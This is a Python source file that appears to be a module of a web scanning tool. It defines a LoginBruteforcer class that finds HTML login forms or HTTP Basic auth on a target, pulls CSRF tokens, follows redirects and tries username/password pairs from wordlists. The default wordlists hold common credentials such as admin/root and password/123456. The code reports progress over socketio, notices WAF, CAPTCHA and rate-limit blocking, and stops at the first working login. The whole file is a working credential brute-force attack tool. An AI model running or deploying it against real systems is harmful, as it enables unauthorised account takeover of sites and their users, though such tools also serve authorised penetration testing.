import requests
from requests.auth import HTTPBasicAuth
import time
import os
from urllib.parse import urljoin
from bs4 import BeautifulSoup

class LoginBruteforcer:
    def __init__(self, scan_id, target, username_list, password_list, socketio=None):
        self.scan_id = scan_id
        self.target = target.rstrip('/')
        self.username_list = username_list
        self.password_list = password_list
        self.socketio = socketio
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.detected_auth_type = None
        self.login_url = None
        self.username_field = None
        self.password_field = None
        self.detected_redirects = set()
        self.results = []
        self.waf_detected = False
        self.blocked = False

    def detect_login_form(self):
        try:
            resp = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for form in soup.find_all('form'):
                password_input = form.find('input', {'type': 'password'})
                if password_input:
                    self.detected_auth_type = 'form'
                    self.login_url = urljoin(self.target, form.get('action', ''))
                    username_input = form.find('input', {'name': lambda x: x and 'user' in x.lower()}) or \
                                     form.find('input', {'name': 'login'}) or \
                                     form.find('input', {'type': 'text'})
                    if username_input:
                        self.username_field = username_input.get('name')
                    else:
                        text_inputs = form.find_all('input', {'type': 'text'})
                        if text_inputs:
                            self.username_field = text_inputs[0].get('name')
                    self.password_field = password_input.get('name')
                    return True
        except Exception as e:
            print(f"Error detecting login form: {e}")
        if resp.status_code == 401 and 'WWW-Authenticate' in resp.headers:
            self.detected_auth_type = 'basic'
            self.login_url = self.target
            return True
        return False

    def check_waf(self, response):
        if response.status_code == 403:
            if any(x in response.headers.get('Server', '').lower() for x in ['cloudflare', 'sucuri', 'mod_security']):
                self.waf_detected = True
                return True
        if response.status_code == 429:
            self.waf_detected = True
            return True
        if 'captcha' in response.text.lower() or 'challenge' in response.text.lower():
            self.waf_detected = True
            return True
        return False

    def check_login_success(self, response, username, password, auth_type):
        if auth_type == 'basic':
            return response.status_code == 200
        elif auth_type == 'form':
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if location and location != self.login_url:
                    return True
            if 'error' not in response.text.lower() and 'invalid' not in response.text.lower():
                return True
        return False

    def handle_redirect(self, response):
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location')
            if location:
                self.login_url = urljoin(self.login_url, location)
                self.detected_redirects.add(self.login_url)
                return True
        return False

    def attempt_basic_auth(self, username, password):
        try:
            resp = self.session.get(self.login_url, auth=HTTPBasicAuth(username, password), timeout=10)
            if self.check_waf(resp):
                self.blocked = True
                return None
            if self.check_login_success(resp, username, password, 'basic'):
                return {'username': username, 'password': password, 'auth_type': 'basic'}
        except Exception as e:
            print(f"Basic auth attempt error: {e}")
        return None

    def attempt_form_auth(self, username, password):
        try:
            data = {self.username_field: username, self.password_field: password}
            # Get page for CSRF token
            resp = self.session.get(self.login_url, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            csrf_input = soup.find('input', {'name': lambda x: x and ('csrf' in x.lower() or 'token' in x.lower())})
            if csrf_input:
                data[csrf_input.get('name')] = csrf_input.get('value')
            resp = self.session.post(self.login_url, data=data, allow_redirects=False, timeout=10)
            if self.check_waf(resp):
                self.blocked = True
                return None
            while resp.status_code in [301, 302, 303, 307, 308]:
                self.handle_redirect(resp)
                resp = self.session.get(self.login_url, allow_redirects=False, timeout=10)
            if self.check_login_success(resp, username, password, 'form'):
                return {'username': username, 'password': password, 'auth_type': 'form'}
        except Exception as e:
            print(f"Form auth attempt error: {e}")
        return None

    def brute_force(self):
        if not self.detect_login_form():
            return False
        total_attempts = len(self.username_list) * len(self.password_list)
        attempts = 0
        for username in self.username_list:
            for password in self.password_list:
                attempts += 1
                if self.socketio:
                    percent = int(attempts / total_attempts * 100)
                    self.socketio.emit('bruteforce_progress', {
                        'scan_id': self.scan_id,
                        'percent': percent,
                        'current': f"{username}:{password}"
                    }, room=self.scan_id)
                if self.blocked:
                    break
                if self.detected_auth_type == 'basic':
                    result = self.attempt_basic_auth(username, password)
                else:
                    result = self.attempt_form_auth(username, password)
                if result:
                    self.results.append(result)
                    # Stop after first success (optional)
                    return True
                time.sleep(0.5)
            if self.blocked:
                break
        return len(self.results) > 0

    @staticmethod
    def get_wordlists():
        custom_usernames = os.environ.get('BRUTE_USERLIST')
        custom_passwords = os.environ.get('BRUTE_PASSLIST')
        if custom_usernames and os.path.exists(custom_usernames):
            with open(custom_usernames, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        else:
            usernames = ['admin', 'root', 'user', 'test', 'guest']
        if custom_passwords and os.path.exists(custom_passwords):
            with open(custom_passwords, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        else:
            passwords = ['password', '123456', 'admin', 'root', 'test']
        return usernames, passwords
